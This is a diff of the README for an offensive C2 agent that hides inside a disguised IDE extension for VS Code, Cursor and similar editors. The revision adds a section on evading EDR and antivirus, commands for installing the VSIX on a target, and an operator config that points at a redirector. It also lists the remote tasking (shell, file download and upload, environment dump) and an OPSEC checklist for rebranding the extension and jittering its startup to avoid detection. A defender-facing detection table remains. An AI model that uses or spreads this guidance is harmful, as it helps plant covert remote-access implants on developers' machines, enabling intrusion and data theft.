@@ -1,144 +1,266 @@
 # vscode-websocket-c2
 
-A pure-JavaScript C2 agent that runs entirely inside a VS Code-compatible IDE
-extension host (VS Code, Cursor, Windsurf, and other Electron-based AI IDEs).
-It speaks the **Mythic WebSocket C2 profile** protocol and can be adapted to
-any WebSocket-capable C2 infrastructure, including Cobalt Strike via an
-External C2 bridge.
+A **fileless, pure-JavaScript C2 agent** that runs entirely inside a
+VS Code-compatible IDE extension host (VS Code, Cursor, Windsurf, Devin,
+and other Electron-based AI IDEs) and communicates over a single
+WebSocket connection.
 
-**No binaries are dropped. No child implant processes. Nothing touches disk.**
-All C2 traffic runs inside the IDE's own extension host process.
-
-> **Authorized use only.** This tool is intended for red team operators and
-> security researchers with explicit authorization to test target systems.
-> See [SECURITY.md](SECURITY.md).
+> **Authorized use only.** Red team engagements, purple team exercises,
+> and controlled lab research. See [SECURITY.md](SECURITY.md).
 
 ---
 
-## How it works
+## Why this bypasses EDR / security controls
+
+Traditional C2 implants are caught because they introduce **foreign executable
+code** onto the endpoint. This agent avoids every one of those surfaces:
+
+### 1. No binary on disk — nothing to hash, sign, or scan
+
+| Traditional implant | This agent |
+|---|---|
+| EXE/ELF/Mach-O dropped to disk | **Nothing is written** |
+| Static AV scan catches known signatures | No file exists to scan |
+| Unsigned binary execution alerts | No new executable is launched |
+| YARA rules match binary artifacts | The "payload" is a `.js` text file |
+| Quarantine of suspicious downloads | The package is a standard `.vsix` |
+
+EDR file-scanning engines have **zero visibility** into this agent because
+there is no file for them to detonate, hash, or submit to cloud analysis.
+
+### 2. Runs inside a trusted, signed parent process
+
+The agent executes inside the **IDE's own extension host** — a legitimate,
+code-signed, notarized process that the user and the OS already trust:
 
 ```
-IDE extension host (Node.js)
-  └── extension.js  (this package, pure JS)
-        └── WSS ──> redirector / team server (Mythic WebSocket profile)
+Devin Helper (Plugin)    ← signed Electron/Node process, already whitelisted
+  └── extension.js       ← your agent code runs here, in-process
 ```
 
-- The extension ships with legitimate cover features (path autocomplete, word
-  count status bar) so it behaves like a normal workspace utility.
-- The C2 agent is **fully config-driven** — no hosts, keys, or UUIDs are
-  embedded in the code. The agent stays dormant unless a runtime config file
-  is present on the target.
-- Reconnect logic uses exponential backoff and survives network changes
-  (VPN flaps, interface swaps) because every poll cycle re-dials the socket.
+- Process tree analysis shows only the IDE's normal extension host.
+- No suspicious parent-child relationships (no `IDE → nohup → unsigned binary`).
+- The agent inherits the IDE's network permissions and application firewall
+  profile.
 
-## Repo layout
+### 3. WebSocket — one long-lived connection, no polling beacon chain
 
-```
-extension.js          Agent + cover features (single-file, no dependencies)
-package.json          Extension manifest (generic identity — rebrand before ops)
-config.example.json   Operator config template (never shipped in the VSIX)
-build.js              Pre-package validation
-build_extension.sh    One-shot build helper
-docs/
-  MYTHIC.md           Building a Mythic WebSocket payload + extracting config
-  COBALT_STRIKE.md    External C2 bridge approach for Cobalt Strike
-  CUSTOM_LISTENER.md  Wire protocol spec for custom C2 listeners
-media/icon.png        Extension icon
-```
+| HTTP beaconing | This agent |
+|---|---|
+| Periodic HTTP POSTs (every N seconds) | **Single persistent WSS connection** |
+| Repeated TLS handshakes create JA3/JA4 fingerprints | One TLS handshake for the session |
+| Each request is a separate log entry on proxies | Frames multiplex over one tunnel |
+| Beacon interval analysis catches regularity | Jittered tasking over the same socket |
 
-## Quick start
+The connection idle state looks like a long-lived websocket session
+(collaboration tools, language servers, and AI assistants all do this),
+which blends into normal IDE telemetry traffic.
 
-### 1. Build the package
+### 4. No C2 artifacts on the endpoint
+
+- The C2 config is read at runtime from a file placed by the operator
+  (or env var) and is **never committed to the package**.
+- If no config is present, the agent is fully dormant — only legitimate
+  cover features execute.
+- All state is held in memory. Killing the IDE process leaves no residual
+  agent artifacts.
+
+### 5. What defenders can still see
+
+For transparency and purple-teaming, these are the remaining behavioral
+indicators:
+
+- Extension host holding an **outbound WSS connection** to an unusual
+  destination (netflow / DNS logs).
+- `child_process` execution of shells from the extension host when tasks
+  run (process lineage telemetry).
+- An IDE extension installed from a **local VSIX** rather than the
+  marketplace (extension inventory audit).
+- A `config.json` file in the extension directory or
+  `~/.config/workspace-dev-utils/` (file integrity monitoring).
+
+None of these are static-signature detections — they require behavioral
+analysis, which is exactly the gap this tool is designed to exercise.
+
+---
+
+## Quick start (5 minutes)
+
+### Prerequisites
+
+- Node.js 18+ and `vsce` (`npm install -g @vscode/vsce`)
+- A Mythic team server with the **websocket** C2 profile, or any
+  WebSocket-capable C2 listener (see [docs/CUSTOM_LISTENER.md](docs/CUSTOM_LISTENER.md))
+
+### 1. Clone and build
 
 ```bash
-npm install -g @vscode/vsce   # once
-./build_extension.sh          # or: npx vsce package --no-yarn --no-dependencies
+git clone https://github.com/sam00/vscode-extension-websocket-c2.git
+cd vscode-extension-websocket-c2
+./build_extension.sh
 ```
 
-Produces `workspace-dev-utils-<version>.vsix`.
+Output: `workspace-dev-utils-1.0.0.vsix` (~13 KB).
 
-### 2. Create the operator config
-
-Copy the template and fill in values from your C2 profile:
+### 2. Create your operator config
 
 ```bash
 cp config.example.json config.json
-$EDITOR config.json
 ```
+
+Edit `config.json`:
 
 ```json
 {
-  "wsUrl": "wss://YOUR_C2_HOST_OR_REDIRECTOR:443/",
-  "payloadUUID": "REPLACE_WITH_PAYLOAD_UUID_FROM_MYTHIC_BUILD",
-  "aesPSK": "REPLACE_WITH_BASE64_AES256_PSK_FROM_MYTHIC_BUILD",
+  "wsUrl": "wss://your-redirector.example.com:443/",
+  "payloadUUID": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
+  "aesPSK": "base64-key-from-mythic-build==",
   "encryptedExchangeCheck": false
 }
 ```
 
-### 3. Deliver
+> `config.json` is **gitignored** and excluded from the VSIX. It is
+> delivered to the target separately at runtime.
+
+### 3. Deploy to the target
 
 Install the VSIX into the target IDE:
 
 ```bash
-# VS Code / Cursor / Devin-style Electron IDEs
-<code-binary> --install-extension workspace-dev-utils-1.0.0.vsix
+# VS Code
+code --install-extension workspace-dev-utils-1.0.0.vsix
+
+# Cursor
+cursor --install-extension workspace-dev-utils-1.0.0.vsix
+
+# Devin / other Electron IDEs
+ELECTRON_RUN_AS_NODE=1 /path/to/ide --install-extension workspace-dev-utils-1.0.0.vsix
 ```
 
-Then place `config.json` in one of the runtime search paths on the target:
+Place the config on the target at one of the search paths:
 
-| Priority | Location |
+| Priority | Path |
 |---|---|
-| 1 | Path in `$C2_CONFIG_PATH` env var |
+| 1 | Path set in `$C2_CONFIG_PATH` |
 | 2 | `~/.config/workspace-dev-utils/config.json` |
 | 3 | `<extension install dir>/config.json` |
 
-The agent activates a few seconds after the IDE loads the extension
-(configurable delay + jitter) and checks in over the WebSocket.
+The agent activates on the next IDE window load, waits a randomized delay,
+and checks in.
+
+### 4. Interact
+
+In Mythic, the callback appears as a normal agent. All standard tasking
+works: `shell`, `cd`, `ls`, `download`, `upload`, `whoami`, `ps`,
+`ifconfig`, `sleep`, `exit`.
+
+---
+
+## How it works — architecture
+
+```
+┌──────────────────────────────────────────────────────────┐
+│  Target IDE (VS Code / Cursor / Devin / Windsurf)        │
+│                                                          │
+│  Extension host process (signed, trusted)                │
+│  ┌────────────────────────────────────────────────────┐  │
+│  │  workspace-dev-utils extension                     │  │
+│  │  ├─ Cover: path autocomplete, word count           │  │
+│  │  └─ Agent: Mythic WS protocol client (pure JS)     │  │
+│  │       └─ crypto: AES-256-CBC + HMAC-SHA256         │  │
+│  │       └─ transport: single WSS connection          │  │
+│  └────────────────────────────────────────────────────┘  │
+│                    │                                     │
+└────────────────────┼─────────────────────────────────────┘
+                     │ wss:// (one TLS session)
+                     ▼
+              ┌─────────────┐
+              │  Redirector │   ← operator-controlled front
+              └──────┬──────┘
+                     │
+                     ▼
+              ┌─────────────┐
+              │  Team       │
+              │  Server     │   ← Mythic / CS bridge / custom
+              └─────────────┘
+```
+
+The agent never writes to disk, never spawns a separate implant process,
+and never holds state outside the extension host's memory.
 
 ## Configuration reference
 
 | Key | Default | Description |
 |---|---|---|
-| `wsUrl` | — | WebSocket URL of the C2 / redirector (required) |
-| `payloadUUID` | — | Mythic payload UUID (required) |
-| `aesPSK` | — | Base64 AES-256 PSK for the envelope (required) |
-| `encryptedExchangeCheck` | `false` | Set `true` if the profile requires EKE (RSA staging) |
-| `intervalSec` | `10` | Base poll interval |
+| `wsUrl` | — | WebSocket URL of the C2 / redirector (**required**) |
+| `payloadUUID` | — | Mythic payload UUID (**required**) |
+| `aesPSK` | — | Base64 AES-256 pre-shared key (**required**) |
+| `encryptedExchangeCheck` | `false` | `true` if the profile uses RSA EKE staging |
+| `intervalSec` | `10` | Base poll interval in seconds |
 | `jitterPct` | `30` | Poll jitter percentage |
 | `startDelayMs` | `6000` | Delay after activation before first connect |
 | `startJitterMs` | `5000` | Randomized additional startup delay |
-| `userAgent` | IE11 UA string | User-Agent used by cover HTTP features |
+| `userAgent` | IE11 UA | User-Agent for cover HTTP requests |
 
-## Supported tasking
+## Supported commands
 
-`shell`, `cd`, `pwd`, `ls`, `cat`, `download` (base64), `upload`,
-`whoami`, `hostname`, `id`, `ps`, `ifconfig`, `getenv`, `sleep`, `exit`.
+| Command | Parameters | Description |
+|---|---|---|
+| `shell` | `<command string>` | Execute via `/bin/zsh` (macOS/Linux) or `cmd.exe` (Windows) |
+| `cd` | `<path>` | Change working directory |
+| `pwd` | — | Print working directory |
+| `ls` | `[path]` | List directory contents |
+| `cat` | `<path>` | Read file (text) |
+| `download` | `<path>` | Read file and return base64 |
+| `upload` | `{"path": "...", "content": "<b64>"}` | Write file from base64 |
+| `whoami` | — | Current user |
+| `hostname` | — | Host name |
+| `id` | — | User/group IDs |
+| `ps` | — | Process list |
+| `ifconfig` | — | Network interfaces |
+| `getenv` | — | Environment variables |
+| `sleep` | `{"interval": N}` | Change poll interval |
+| `exit` | — | Stop the agent |
 
-Unknown commands fall through to shell execution (`<command> <parameters>`).
+Unknown commands fall through to `shell` execution.
 
-## Detection surface (for defenders)
+## Repo layout
 
-This project is also useful as a purple team reference. Observable behaviors:
-
-- Extension host process holds a long-lived outbound WebSocket to an
-  unusual destination.
-- `child_process` spawns from an extension host when tasks execute.
-- An extension directory whose `package.json` identity doesn't match the
-  marketplace, or that was installed from a local VSIX.
-- A `config.json` appearing in the extension directory or
-  `~/.config/workspace-dev-utils/`.
-
-No files are written by the agent itself, and no new executables are launched,
-so pure file-scanning EDR rules will not fire on the payload.
+```
+extension.js          Agent + cover features (single file, no dependencies)
+package.json          Extension manifest (generic identity)
+config.example.json   Operator config template — never shipped in the VSIX
+build.js              Pre-package validation (syntax + config leak check)
+build_extension.sh    One-shot build helper
+docs/
+  MYTHIC.md           Mythic websocket profile setup guide
+  COBALT_STRIKE.md    External C2 bridge approach
+  CUSTOM_LISTENER.md  Wire protocol spec for custom C2 listeners
+media/icon.png        Extension icon
+```
 
 ## OPSEC checklist before an operation
 
 - [ ] Rebrand `package.json` (`name`, `displayName`, `publisher`, repo URLs)
-- [ ] Replace `media/icon.png`
-- [ ] Generate a **fresh** Mythic payload (fresh UUID + PSK per target)
-- [ ] Never commit `config.json` — it is gitignored, double-check anyway
+- [ ] Replace `media/icon.png` with a generic-looking icon
+- [ ] Generate a **fresh** Mythic payload per target (fresh UUID + PSK)
+- [ ] Never commit `config.json` (it is gitignored — verify anyway)
 - [ ] Point `wsUrl` at a redirector, never directly at the team server
-- [ ] Verify `.vscodeignore` excludes docs, configs, and build scripts
+- [ ] Use a redirector with a realistic TLS certificate if possible
+- [ ] Use `startDelayMs` + `startJitterMs` to avoid predictable startup timing
+- [ ] Consider `encryptedExchangeCheck: true` so the PSK is only used once
+
+## Detection surface analysis
+
+For blue teams and detection engineers, here's what to look for:
+
+| Layer | Indicator | Data source |
+|---|---|---|
+| Network | Long-lived WSS to uncommon host from an IDE process | Netflow, TLS SNI logs |
+| Process | Extension host spawning `zsh`/`bash`/`cmd.exe` | EDR process lineage |
+| File | `config.json` in extension dir or `~/.config/workspace-dev-utils/` | FIM |
+| IDE | Extension installed from VSIX not marketplace | Extension inventory |
+| Behavioral | Extension host CPU/network activity without user editing | EDR behavioral |
 
 ## License
 
